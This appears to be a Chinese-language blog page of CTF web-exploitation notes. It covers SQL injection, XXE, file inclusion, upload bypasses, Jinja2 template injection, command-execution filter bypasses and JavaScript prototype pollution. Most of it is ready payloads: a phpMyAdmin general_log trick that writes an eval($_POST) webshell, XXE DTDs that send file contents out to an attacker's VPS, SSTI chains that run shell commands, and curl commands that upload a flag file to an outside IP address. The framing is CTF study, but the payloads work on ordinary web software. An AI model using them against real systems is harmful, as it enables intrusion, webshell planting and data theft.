<h2 id="file协议妙用"><a href="#file协议妙用" class="headerlink" title="file协议妙用"></a>file协议妙用</h2><p>我们可以通过 file:///proc/self/cwd/index.php 获得index.php文件。在linux中，每个进程都有一个PID，而/proc/xxx/下存放着与该进程相关的信息（这里的xxx就是PID）。/proc/xxx/下的cwd是软链接，self表示本进程。当我们通过访问Apache运行的网站时，/proc/self/cwd/就相当于apache的根目录，例如我本机Apache的根目录是/var/www/html</p>
<p><img src="http://static.zybuluo.com/1160307775/osyc4y4bkxtkyuy286wrpuh0/image_1ddqj7884117n43j19vu1rgn347p.png" alt="image_1ddqj7884117n43j19vu1rgn347p.png-54.3kB"></p>
<h3 id="arp表"><a href="#arp表" class="headerlink" title="arp表"></a>arp表</h3><p><code>proc/net/arp</code></p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><p>sql语句查询mysql操作日志:<a href="http://www.cnblogs.com/jhin-wxy/p/8965888.html" target="_blank" rel="noopener">http://www.cnblogs.com/jhin-wxy/p/8965888.html</a></p>
<p>mysql5.7文档:<a href="https://dev.mysql.com/doc/" target="_blank" rel="noopener">https://dev.mysql.com/doc/</a></p>
<h2 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h2><ul>
<li>查询所有的数据库:<pre><code>select group_concat(schema_name) from  information_schema.schemata</code></pre></li>
<li>查询数据表:<pre><code>select group_concat(table_name) from  information_schema.tables where table_schema = database()</code></pre></li>
<li>查询字段:<pre><code>select group_concat(column_name) from  information_schema.columns where table_name = &#39;user&#39;</code></pre></li>
</ul>
<h2 id="盲注语句"><a href="#盲注语句" class="headerlink" title="盲注语句"></a>盲注语句</h2><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>可以用python3的模块string打印所有字母和符号</p>
<pre><code>import string

for c in string.printable</code></pre><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><pre><code>and ascii(substr(database(),1,1))&gt;?</code></pre><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>五种造成延时的方法:<a href="https://www.smi1e.top/sql%e6%b3%a8%e5%85%a5%e7%ac%94%e8%ae%b0/[https://www.cdxy.me/?p=789](https://www.cdxy.me/?p=789)" target="_blank" rel="noopener">MySQL时间盲注五种延时方法</a></p>
<p>推荐sleep、benchmark</p>
<p><img src="http://static.zybuluo.com/1160307775/ggkko75qnyhcasecsp27sqmz/image_1dgk48rf11ka11ehqo7b6hl8eu19.png" alt="image_1dgk48rf11ka11ehqo7b6hl8eu19.png-33kB"></p>
<p>配合if使用效果极佳</p>
<pre><code>if(expr1,expr2,sleep(10))</code></pre><p>如果 expr1 为真，则if函数执行expr2语句; 否则执行sleep语句。</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>updatexml()这个报错函数真的太强了，首先你要了解<a href="http://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html" target="_blank" rel="noopener">Xpath</a>。在Mysql中使用了一下这个函数，发现当XPath 使用路径表达式不符合规范时，就会报错，而报错的内容就非常神奇了。下面贴一张报错内容和语法：</p>
<pre><code>or updatexml(1,concat(0x7e,database()),1)</code></pre><p>报错注入的姿势有很多，po一个写了十种报错函数的<a href="http://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">帖子</a></p>
<h2 id="堆叠注入-经典union被过滤"><a href="#堆叠注入-经典union被过滤" class="headerlink" title="堆叠注入(经典union被过滤)"></a>堆叠注入(经典union被过滤)</h2><p>PHP中如果使用PDO的连接形式则可能产生堆叠注入</p>
<pre><code>$con = &quot;mysql:host=localhost;port=3306;dbname=acg&quot;;
$conn = new PDO($con, &#39;root&#39;, &#39;nihao123&#39;);</code></pre><h3 id="不用select查询字段值"><a href="#不用select查询字段值" class="headerlink" title="不用select查询字段值"></a>不用select查询字段值</h3><p>前提条件是允许执行多条sql语句(即multi模式)</p>
<h4 id="mysql的预查询"><a href="#mysql的预查询" class="headerlink" title="mysql的预查询"></a>mysql的预查询</h4><p>用SET方法设置一个全局变量值为”select xxx from xx”,再用预编译执行这个全局变量</p>
<pre><code>SET+@hpdoger=concat(char(115,101,108,101,99,116,32),char(102,108,97,103,32),char(102,114,111,109,32),char(96),1919810931114514,char(96));prepare+hpdoger+from+@hpdoger;execute+hpdoger;#

SET @SQL=0x494E5345525420494E544F206D6F76696520286E616D652C20636F6E74656E74292056414C55455320282761616161272C27616161612729;PREPARE pord FROM @SQL;EXECUTE pord;</code></pre><p>此时全局变量@hpdoger的值就是</p>
<pre><code>select flag from xxxx;</code></pre><p><img src="http://static.zybuluo.com/1160307775/cmk9b5q0q1qazpnmyyv55oq0/image_1ds4s6841ke71dm0ord1e8t14uf9.png" alt="image_1ds4s6841ke71dm0ord1e8t14uf9.png-60.2kB"></p>
<p>后面用预编译执行全局变量是因为：想要执行全局变量的前提是有Select语句，但是预编译就不需要，即我们可以用<code>EXECUTE</code>来执行</p>
<h4 id="使用handler"><a href="#使用handler" class="headerlink" title="使用handler"></a>使用handler</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a></p>
<h3 id="当set被过滤"><a href="#当set被过滤" class="headerlink" title="当set被过滤"></a>当set被过滤</h3><p>上面提到的是用<code>SET @hpdoger</code>来设置变量，如果select没被过滤的话，还可以用<code>select @hpdoger:=0x巴拉巴拉</code>来设置变量，详情见：<a href="https://blog.csdn.net/JesseYoung/article/details/40779631" target="_blank" rel="noopener">https://blog.csdn.net/JesseYoung/article/details/40779631</a></p>
<p>所以上面的预处理语句还可以转换成下面的用法:</p>
<pre><code>select @hpdoger:=0x73656c656374202a2066726f6d2075736572;PREPARE pord FROM @hpdoger;EXECUTE pord;</code></pre><p><img src="http://static.zybuluo.com/1160307775/yb25h693ft4hw84tle8b5zfp/image_1ds4tb8gk1kpe1m1matr9um1bfsm.png" alt="image_1ds4tb8gk1kpe1m1matr9um1bfsm.png-78.1kB"></p>
<h2 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h2><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="过滤了”in”或者”or”"><a href="#过滤了”in”或者”or”" class="headerlink" title="过滤了”in”或者”or”"></a>过滤了”in”或者”or”</h3><p>查库名可以用一种新的方式，但是会显示所有存在数据的表名</p>
<pre><code>select table_schema from sys.x$schema_flattened_keys;</code></pre><p>查所有的数据表</p>
<pre><code>select table_name from sys.schema_table_statistics limit 0,5;</code></pre><p><img src="http://static.zybuluo.com/1160307775/7h75uvzqq9oez5b08huxcf77/image_1du2onu9nvd33131qsq18fftfh9.png" alt="image_1du2onu9nvd33131qsq18fftfh9.png-44.9kB"></p>
<h2 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h2><h3 id="phpmyadmin日志getshell"><a href="#phpmyadmin日志getshell" class="headerlink" title="phpmyadmin日志getshell"></a>phpmyadmin日志getshell</h3><ol>
<li>使用url报错爆出绝对路径，再尝试用sql写shell<pre><code>/phpMyAdmin/index.php?lang[]=1</code></pre></li>
</ol>
<p>2.查general_log的路径，与是否开启日志记录功能</p>
<pre><code>SHOW+GLOBAL+VARIABLES+LIKE+&#39;general_log%&#39;</code></pre><ol start="2">
<li>接着执行sql语句，木马就是日志文件<pre><code>SET GLOBAL general_log=&#39;on&#39;;
SET GLOBAL general_log_file=&#39;C:/phpStudy/www/xxx.php&#39;; # 可自定义
SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;;</code></pre></li>
</ol>
<h3 id="GETSHELL总结"><a href="#GETSHELL总结" class="headerlink" title="GETSHELL总结"></a>GETSHELL总结</h3><p><a href="https://xz.aliyun.com/t/2460" target="_blank" rel="noopener">https://xz.aliyun.com/t/2460</a></p>
<h2 id="MYSQL5-7以后的一些特性"><a href="#MYSQL5-7以后的一些特性" class="headerlink" title="MYSQL5.7以后的一些特性"></a>MYSQL5.7以后的一些特性</h2><p>增加了很多报错函数</p>
<pre><code>ST_LatFromGeoHash()ST_LongFromGeoHash()GTID_SUBSET()GTID_SUBTRACT()ST_PointFromGeoHash()</code></pre><pre><code>mysql&gt; select ST_LatFromGeoHash(version());</code></pre><p>information_schema被过滤掉的话，可以用Innob来绕过</p>
<h1 id="XXE利用"><a href="#XXE利用" class="headerlink" title="XXE利用"></a>XXE利用</h1><h2 id="外部实体常用poc"><a href="#外部实体常用poc" class="headerlink" title="外部实体常用poc"></a>外部实体常用poc</h2><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
&lt;root&gt;&amp;file;&lt;/root&gt;</code></pre><h2 id="参数实体常用poc"><a href="#参数实体常用poc" class="headerlink" title="参数实体常用poc"></a>参数实体常用poc</h2><p>外部引入参数实体的例子：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE a [
    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;
    %name;
]&gt;</code></pre><h2 id="参数实体调用的错误示范"><a href="#参数实体调用的错误示范" class="headerlink" title="参数实体调用的错误示范"></a>参数实体调用的错误示范</h2><p>第一种，错误原因：<strong>XML解析器都不会解析同级参数实体的内容</strong></p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE message [
    &lt;!ENTITY % files SYSTEM &quot;file:///etc/passwd&quot;&gt;  
    &lt;!ENTITY % send SYSTEM &quot;http://myip/?a=%files;&quot;&gt; 
    %send;
]&gt;</code></pre><p>第二种虽然不同级，但直接请求也会发生错误。错误原因：<strong>禁止在内部ENTITY中引用参数实体，但是支持在外部声明的dtd中引入，因此我们可以把下面的payload作为外部dtd文件使用</strong></p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE message [
    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  
    &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://myip/?%file;&#39;&gt;&quot;&gt;
    %start;
    %send;
]&gt;</code></pre><h2 id="引入外部dtd文件-amp-OOB-读取本地文件"><a href="#引入外部dtd文件-amp-OOB-读取本地文件" class="headerlink" title="引入外部dtd文件&amp;OOB-读取本地文件"></a>引入外部dtd文件&amp;OOB-读取本地文件</h2><p>直接发起的xxe请求如下，或者以xml文件的形式放在vps(前提XXE可以解析这个xml文件)</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;

&lt;!DOCTYPE ANY[

&lt;!ENTITY % send SYSTEM &#39;http://your_vps/test2.dtd&#39;&gt;

%send;
%test;
%back;
]&gt;</code></pre><p>vps上的外部DTD声明文件test2.dtd如下，读取文件并发送请求ood到自己的vps：</p>
<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;

&lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM &#39;http://your_vps/?file=%file;&#39;&gt;&quot;&gt;</code></pre><h2 id="引入外部dtd文件-amp-报错回显-读取本地文件"><a href="#引入外部dtd文件-amp-报错回显-读取本地文件" class="headerlink" title="引入外部dtd文件&amp;报错回显-读取本地文件"></a>引入外部dtd文件&amp;报错回显-读取本地文件</h2><p>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。</p>
<p>所以和OOB的构造方式几乎只有url出不同，其他地方一模一样。</p>
<p><img src="http://static.zybuluo.com/1160307775/o09e0gt16woeslut7mcjthgm/image_1def8qqag1frb1pfu1ghq1lkvbhf9.png" alt="image_1def8qqag1frb1pfu1ghq1lkvbhf9.png-81.8kB"></p>
<h2 id="无需引入外部dtd文件-三层嵌套文件读取"><a href="#无需引入外部dtd文件-三层嵌套文件读取" class="headerlink" title="无需引入外部dtd文件-三层嵌套文件读取"></a>无需引入外部dtd文件-三层嵌套文件读取</h2><p>W3C协议是不允许在内部的实体声明中引用参数实体，但是很多XML解析器并没有很好的执行这个检查。几乎所有XML解析器能够发现如下这种两层嵌套式的</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE message [
    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  
    &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://myip/?%file;&#39;&gt;&quot;&gt;
    %start;
    %send;
]&gt;
&lt;message&gt;10&lt;/message&gt;</code></pre><p>但是对于三层嵌套参数实体构造的payload有些XML解析器是无法检测出来的，比如我本次测试的两种组合php7.2 + libxml2 2.9.4版本和php5.4 + libxml2 2.9.1都是可以有效利用的</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE message [
    &lt;!ELEMENT message ANY&gt;
    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;
    &lt;!ENTITY % para &#39;
        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;
        &amp;#x25;para2;
    &#39;&gt;
    %para;
]&gt;
&lt;message&gt;10&lt;/message&gt;</code></pre><p>这意味着，无需引用外部dtd也可以实现Blind XXE。</p>
<h2 id="利用本地xxe来bypass协议不回显的情况"><a href="#利用本地xxe来bypass协议不回显的情况" class="headerlink" title="利用本地xxe来bypass协议不回显的情况"></a>利用本地xxe来bypass协议不回显的情况</h2><p><a href="https://xz.aliyun.com/t/5503" target="_blank" rel="noopener">https://xz.aliyun.com/t/5503</a></p>
<p><a href="https://www.jishuwen.com/d/2EGU" target="_blank" rel="noopener">https://www.jishuwen.com/d/2EGU</a></p>
<h3 id="dtd-1"><a href="#dtd-1" class="headerlink" title="dtd-1"></a>dtd-1</h3><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE message [
    &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;
    &lt;!ENTITY % ISOamso &#39;
        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
        &amp;#x25;eval;
        &amp;#x25;send;
    &#39;&gt; 
    %remote;
]&gt;</code></pre><h3 id="javaweb-的本地xxe"><a href="#javaweb-的本地xxe" class="headerlink" title="javaweb 的本地xxe"></a>javaweb 的本地xxe</h3><pre><code>&lt;!DOCTYPE message [
    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;

    &lt;!ENTITY % expr &#39;aaa)&gt;
        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///FILE_TO_READ&quot;&gt;
        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
        &amp;#x25;eval;
        &amp;#x25;error;
        &lt;!ELEMENT aa (bb&#39;&gt;

    %local_dtd;
]&gt;
&lt;message&gt;&lt;/message&gt;</code></pre><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="骚姿势-1"><a href="#骚姿势-1" class="headerlink" title="骚姿势"></a>骚姿势</h2><h3 id="proc"><a href="#proc" class="headerlink" title="/proc"></a>/proc</h3><p>见SSRF-File协议妙用</p>
<h3 id="dev-文件读写io"><a href="#dev-文件读写io" class="headerlink" title="/dev-文件读写io"></a>/dev-文件读写io</h3><p>当一个文件被打开时，此时/dev/fd下就存在读写的文件描述符，通过<code>include</code>就能把文件读出来。具体见下面的场景</p>
<pre><code>&lt;?php
  $fp = fopen(&quot;/tmp/flag.txt&quot;, &quot;r&quot;);
  if($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;GET&#39; &amp;&amp; isset($_GET[&#39;include&#39;]) &amp;&amp; strlen($_GET[&#39;include&#39;]) &lt;= 10) {
    include($_GET[&#39;include&#39;]);
  }
  fclose($fp);
  echo highlight_file(__FILE__, true);
?&gt;</code></pre><p>解法:<code>include=/dev/fd/11</code>，描述符不一定是11，可能是4-x中的任意数字</p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h2><pre><code>1、改content-type?
2、是否存在解析漏洞 .php.xxx
3、是否可以上传其它能解析的后缀？
4、存在二次渲染漏洞？imagecreatfrompng
5、apache2.4是否存在0a换行绕过？
6、htaccess、.user.ini是否可以上传？</code></pre><h2 id="妙用-htaccess"><a href="#妙用-htaccess" class="headerlink" title="妙用.htaccess"></a>妙用.htaccess</h2><p>有个.htaccess所有用法合集:<a href="https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet" target="_blank" rel="noopener">PHP htaccess injection cheat sheet</a></p>
<p>apache中的.htaccess</p>
<p>将同目录下的jpg解析为php,文件内容如下</p>
<pre><code>AddType application/x-httpd-php .jpg</code></pre><h2 id="妙用-user-ini"><a href="#妙用-user-ini" class="headerlink" title="妙用.user.ini"></a>妙用.user.ini</h2><p>.user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。我的nginx服务器全部是fpm/fastcgi，我的IIS php5.3以上的全部用的fastcgi/cgi，我win下的apache上也用的fcgi，可谓很广，不像.htaccess有局限性。</p>
<p>当一个文件夹下有php</p>
<pre><code>php_value auto_prepend_file = f13g.php</code></pre><h2 id="php-写文件"><a href="#php-写文件" class="headerlink" title="php/.写文件"></a>php/.写文件</h2><p>后缀给<code>php/.</code>，在函数操作的时候也可以存为php<br><img src="http://static.zybuluo.com/1160307775/00ryfouierckkzrm1apw6qop/image_1dikffg1ciuv185fg3v17661m9vp.png" alt="image_1dikffg1ciuv185fg3v17661m9vp.png-83.5kB"></p>
<p>目前测试copy、file_get_contents都可以</p>
<h1 id="模版注入"><a href="#模版注入" class="headerlink" title="模版注入"></a>模版注入</h1><h2 id="Python-Jinja2引擎"><a href="#Python-Jinja2引擎" class="headerlink" title="Python-Jinja2引擎"></a>Python-Jinja2引擎</h2><h3 id="SSTI存在-amp-不存在"><a href="#SSTI存在-amp-不存在" class="headerlink" title="SSTI存在&amp;不存在"></a>SSTI存在&amp;不存在</h3><p>后端如果使用<code>request.url</code>，则会把传递的参数编码，而<code>request.args.get</code>依然存在SSTi的问题。</p>
<h3 id="常见攻击流程"><a href="#常见攻击流程" class="headerlink" title="常见攻击流程"></a>常见攻击流程</h3><p>入门引导:<a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679</a></p>
<p>Python模版注入的解题思路就是：通过<code>__class__</code>属性找到基类object，通过<code>__subclasses__()</code>查看object中有哪些类可以利用，一般都是去寻找os类、然后通过<code>__globals__</code>全局来查找所有的方法及变量及参数，通常用到<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>类的<code>popen</code>方法。</p>
<p>调用链大致如下：</p>
<pre><code>http://127.0.0.1:5000/test?{{"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen'](''cat+/flag').read()}}</code></pre><h3 id="执行多行Python语句"><a href="#执行多行Python语句" class="headerlink" title="执行多行Python语句"></a>执行多行Python语句</h3><p>具体见P神vulhub的用法:<a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/flask/ssti</a></p>
<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}</code></pre><h3 id="寻找可RCE的类"><a href="#寻找可RCE的类" class="headerlink" title="寻找可RCE的类"></a>寻找可RCE的类</h3><pre><code>cnt=0
for item in [].__class__.__base__.__subclasses__():
    try:
        if &#39;os&#39; in item.__init__.__globals__:
            print cnt,item
        cnt+=1
    except:
        print &quot;error&quot;,cnt,item
        cnt+=1
        continue</code></pre><p>第二种</p>
<pre><code>#!/usr/bin/env python
# encoding: utf-8

cnt=0
for item in &quot;&quot;.__class__.__mro__[-1].__subclasses__():
    try:
        cnt2=0
        for i in item.__init__.__globals__:
            if &#39;eval&#39; in item.__init__.__globals__[i]:
                print cnt,item,cnt2,i
            cnt2+=1
        cnt+=1
    except:
        print &quot;error&quot;,cnt,item
        cnt+=1
        continue</code></pre><h3 id="过滤bypass"><a href="#过滤bypass" class="headerlink" title="过滤bypass"></a>过滤bypass</h3><p>过滤了下划线可以考虑用动态传参绕过</p>
<pre><code>name={{request[request.args.param]}}&amp;param=__class__</code></pre><p>过滤中括号可以直接用”.”来代替属性，圆括号代替下标选择</p>
<pre><code>{{""|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(77)|attr(request.args.ini)|attr(request.args.glo)}}&amp;param=__class__&amp;mro=__base__&amp;sub=__subclasses__&amp;item=__getitem__&amp;ini=__init__&amp;glo=__globals__</code></pre><p>过滤了双引号或者点号，可以用|来绕过，|是过滤器<br><img src="http://static.zybuluo.com/1160307775/8c4ksg2ynr1y0pix9ydlya9a/image_1dnp4tbpur791ed1agc189d14cp.png" alt="image_1dnp4tbpur791ed1agc189d14cp.png-91.2kB"></p>
<h2 id="相关链接-1"><a href="#相关链接-1" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://xz.aliyun.com/t/3679#toc-0" target="_blank" rel="noopener">flask之ssti模版注入从零到入门</a></p>
<p>很详细的一篇文章：<a href="https://www.anquanke.com/post/id/188172#h2-0" target="_blank" rel="noopener">SSTI/沙盒逃逸详细总结</a></p>
<p><a href="https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/" target="_blank" rel="noopener">从SSTI到沙箱逃逸-jinja2</a></p>
<p><a href="https://blog.szfszf.top/tech/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8E%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E4%BA%8C/" target="_blank" rel="noopener">Python沙箱逃逸与模板注入SSTI</a></p>
<p><a href="http://docs.jinkan.org/docs/jinja2/templates.html#builtin-filters" target="_blank" rel="noopener">模板设计者文档</a></p>
<h1 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><ul>
<li><p>php://input<br><img src="http://static.zybuluo.com/1160307775/bm2tqiqmypmrpzaszatv1w0t/image_1d83kt9ffd621pod1p0o62e125m.png" alt="image_1d83kt9ffd621pod1p0o62e125m.png-121kB"></p>
</li>
<li><p>php://filter</p>
<pre><code>file=php://filter/read=convert.base64-encode/resource=index.php</code></pre></li>
<li><p>phar://<br><img src="http://static.zybuluo.com/1160307775/7xr0kz01z7zheao17t65uhdq/image_1d83liset16qc1k5e1bva4j3a7f1t.png" alt="image_1d83liset16qc1k5e1bva4j3a7f1t.png-107.3kB"></p>
</li>
</ul>
<h1 id="命令执行类"><a href="#命令执行类" class="headerlink" title="命令执行类"></a>命令执行类</h1><h2 id="常识-2"><a href="#常识-2" class="headerlink" title="常识"></a>常识</h2><p>获取flag文件并用Curl协议外带到自己的vps</p>
<pre><code>curl &#39;http://50.16.48.95/&#39; data &quot;`cat+/flag.txt`&quot;</code></pre><pre><code>curl -T ./flag.txt http://50.16.48.95/</code></pre><h2 id="命令执行Bypass"><a href="#命令执行Bypass" class="headerlink" title="命令执行Bypass"></a>命令执行Bypass</h2><h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><p><img src="http://static.zybuluo.com/1160307775/s3yk12vptcnavyiki9wxfi51/image_1dpcjfim7tn1jc6eo7vsdr6i9.png" alt="image_1dpcjfim7tn1jc6eo7vsdr6i9.png-92.2kB"></p>
<h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><pre><code>ca\t /f\lag</code></pre><h3 id="双引号-amp-分号–复杂变量"><a href="#双引号-amp-分号–复杂变量" class="headerlink" title="双引号&amp;分号–复杂变量"></a>双引号&amp;分号–复杂变量</h3><p>PHP复杂变量：<a href="https://xz.aliyun.com/t/4785" target="_blank" rel="noopener">https://xz.aliyun.com/t/4785</a></p>
<pre><code>${system(whoami)}</code></pre><p><img src="http://static.zybuluo.com/1160307775/ze8sakz6ijx1zx262kicbqnj/image_1dcp3bus82rs1ugp15ij1l75121e9.png" alt="image_1dcp3bus82rs1ugp15ij1l75121e9.png-79.6kB"></p>
<h3 id="单参数过滤-用http头传参绕过"><a href="#单参数过滤-用http头传参绕过" class="headerlink" title="单参数过滤-用http头传参绕过"></a>单参数过滤-用http头传参绕过</h3><p>nginx、apache中都可以用get_defined_vars()，但是apche还可以用getallheaders()</p>
<pre><code>eval(next(current(get_defined_vars())));&amp;b=var_dump(file_get_contents(&#39;/flag&#39;));</code></pre><p>还可以对session进行操作来绕过检测</p>
<pre><code>eval(hex2bin(session_id(session_start())));

PHPSESSID=7072696e745f722866696c655f6765745f636f6e74656e747328272e2e2f666c61675f7068706279703473732729293b</code></pre><h1 id="hash长度拓展"><a href="#hash长度拓展" class="headerlink" title="hash长度拓展"></a>hash长度拓展</h1><p>已知md5($key.xxx)的一个值，还知道$key的长度，就可以构造任意md5($key.xxx)</p>
<h1 id="Javascript原型链污染"><a href="#Javascript原型链污染" class="headerlink" title="Javascript原型链污染"></a>Javascript原型链污染</h1><h2 id="骚操作-preventExtensions绕过"><a href="#骚操作-preventExtensions绕过" class="headerlink" title="骚操作-preventExtensions绕过"></a>骚操作-preventExtensions绕过</h2><p><img src="http://static.zybuluo.com/1160307775/rlrzawswdkm43aim2nqvqfyj/image_1drfesanc17521a6ipu112avoua9.png" alt="image_1drfesanc17521a6ipu112avoua9.png-159.7kB"></p>
<h2 id="Javascript原型链知识"><a href="#Javascript原型链知识" class="headerlink" title="Javascript原型链知识"></a>Javascript原型链知识</h2><p>实例对象的 __proto__与创建该实例对象的构造函数的 prototype 是相等的</p>
<pre><code>function Cat() {
    this.color = &#39;orange&#39;
}

var cat = new Cat()

console.log(cat.__proto__ === Cat.prototype)   // true</code></pre><p><img src="http://static.zybuluo.com/1160307775/49tkdxytis065nq33e4ah64d/image_1dma6rinf3k4lvv13cfj0l15fo9.png" alt="image_1dma6rinf3k4lvv13cfj0l15fo9.png-53.4kB"></p>
<p>在 JavaScript 中，如果想访问某个属性，首先会在实例对象（cat）的内部寻找，如果没找到，就会在该对象的原型（cat.__proto__，即 Cat.prototype）上找，我们知道，对象的原型也是对象，它也有原型，如果在对象的原型上也没有找到目标属性，则会在对象的原型的原型（Cat.prototype.__proto__）上寻找，以此内推，直到找到这个属性或者到达了最顶层。在原型上一层一层寻找，这便就是原型链了。</p>
<p>实例对象原型的原型是Object.prototype，而它的原型是null，null 没有原型，所以 Object.prototype 就是原型链的最顶端。</p>
<h3 id="constructor-构造函数"><a href="#constructor-构造函数" class="headerlink" title="constructor-构造函数"></a>constructor-构造函数</h3><p>javascript需要有一个像经典语言那样的能够创建对象模板的方法，可以根据模板自动化的创建我们需要的对象。JavaScript 用一种称为构建函数的特殊函数来定义对象和它们的特征。构建函数提供了创建您所需对象（实例）的有效方法，将对象的数据和特征函数按需联结至相应对象</p>
<p>一个例子如下：</p>
<pre><code>function Person(name) {
  this.name = name;
  this.greeting = function() {
    alert(&#39;Hi! I\&#39;m &#39; + this.name + &#39;.&#39;);
  };
}</code></pre><p>这个构建函数是 JavaScript 版本的类，这里使用了this关键词，指向这个构建函数创建的示例自身，而非指向构建函数(这跟其他面向对象语言中的this的含义一样)</p>
<p><strong>一个构建函数通常是大写字母开头，这样便于区分构建函数和普通函数</strong></p>
<p>每一个数据类型都有一个属性叫做<code>constructor</code>，指的就是自身的构造函数</p>
<p><img src="http://static.zybuluo.com/1160307775/vwwtw14kpni8i6mel7knng1w/image_1dtbe0q5qtkp1rldgr413l11a159.png" alt="image_1dtbe0q5qtkp1rldgr413l11a159.png-10.3kB">。</p>
<h3 id="prototype-原型"><a href="#prototype-原型" class="headerlink" title="prototype-原型"></a>prototype-原型</h3><p>可以把<code>prototype</code>看作<strong>类/方法/各种原始数据类型</strong>(这里统称为A)中的一个<strong>属性(画重点)</strong>，而所有用<strong>A类/方法/各种原始数据类型</strong>，得到的实例化的对象，都将拥有这个属性(prototype)中的所有内容</p>
<p>对于Object/Arrary/Function这三类数据类型来说，都有自己最原始的prototype。</p>
<p><img src="http://static.zybuluo.com/1160307775/nf076lg3f4rk6w8ugfbfozid/image_1dtbcvmil4nv6me1ndtgo21miap.png" alt="image_1dtbcvmil4nv6me1ndtgo21miap.png-709.6kB"></p>
